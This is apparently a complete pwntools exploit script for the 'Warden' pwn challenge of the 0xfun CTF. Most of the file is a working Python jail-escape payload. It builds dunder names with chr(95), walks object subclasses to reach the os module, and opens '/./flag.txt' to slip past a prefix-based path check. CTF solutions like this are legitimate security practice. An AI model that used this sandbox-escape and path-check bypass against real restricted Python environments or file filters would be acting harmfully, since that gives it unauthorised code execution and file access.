#!/usr/bin/env python3
"""
Warden - 0xfun CTF (pwn, 500pts, hard)
Exploit: Python jail escape + warden path check bypass via /./flag.txt
"""
from pwn import *

HOST, PORT = "chall.0xfun.org", 23662

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug('./warden', gdbscript='continue')
    else:
        return process(['./warden', 'python3', 'jail.py'])

# Python jail escape payload:
# 1. Build "__" dynamically with chr(95)*2 (bypasses string literal check)
# 2. Use getattr() to access dunder attrs (bypasses AST .attr check)
# 3. Traverse object.__subclasses__() to find os module in __init__.__globals__
# 4. Open /./flag.txt - the "./" bypasses warden's strncmp("/flag", ...) prefix check
PAYLOAD = '''
u = chr(95)*2
obj = getattr(getattr((), u+'class'+u), u+'bases'+u)[0]
subs = getattr(obj, u+'subclasses'+u)()
os_mod = None
for s in subs:
    try:
        g = getattr(getattr(s, u+'init'+u), u+'globals'+u)
        if 'os' in g:
            os_mod = g['os']
            break
    except Exception:
        pass

if os_mod:
    fd = os_mod.open('/./flag.txt', 0)
    data = os_mod.read(fd, 4096)
    os_mod.close(fd)
    print(data)
'''

def exploit():
    io = get_process()
    io.recvuntil(b'Ctrl+D).', timeout=10)
    io.sendline(PAYLOAD.encode())
    import time
    time.sleep(0.5)
    io.shutdown('send')
    try:
        output = io.recvall(timeout=15)
        log.info(f"Output:\n{output.decode()}")
    except:
        pass
    io.close()

if __name__ == "__main__":
    exploit()
